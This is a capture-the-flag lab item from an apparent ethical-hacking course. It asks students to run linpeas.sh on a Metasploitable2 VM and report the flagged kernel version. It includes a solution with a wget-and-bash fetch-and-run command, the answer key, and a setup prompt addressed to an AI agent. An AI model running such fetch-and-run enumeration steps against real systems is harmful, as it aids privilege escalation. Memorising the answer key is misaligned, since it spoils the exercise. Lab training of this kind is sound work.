# Q053 — linpeas Privilege Audit

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🟡 Medium |
| **Tools** | `linpeas, python3` |
| **Time budget** | 15–25 min |

---

## 📝 Question

After getting an msfadmin shell on Metasploitable, run linpeas.sh. Report the **kernel version** flagged.

---

## 🎯 Flag Format

```
kernel=<x.y.z>
```

Example: `kernel=2.6.24`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Transfer linpeas via wget from Parrot HTTP server.
</details>

<details>
<summary>Hint 2</summary>

Look for the `Kernel` section.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# On Parrot: python3 -m http.server 8000
# On target: wget http://192.168.52.128:8000/linpeas.sh && bash linpeas.sh
```

Kernel 2.6.24-16-server reported.

**Answer:** `kernel=2.6.24`

📖 Ref: [tools/linpeas.md](../../tools/linpeas.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q053:
1. Verify Metasploitable2 (192.168.52.129) up; ssh as msfadmin available.
2. Download linpeas.sh onto Parrot: curl -sLO https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh; chmod +x linpeas.sh (place in cwd for python http.server).
3. Start Parrot webserver in that dir: python3 -m http.server 8000 (background).
4. From msfadmin shell on target: wget http://192.168.52.128:8000/linpeas.sh will work.

Report back: "Lab ready for Q053 — linpeas.sh hosted on Parrot:8000, ssh to 192.168.52.129 works".
```
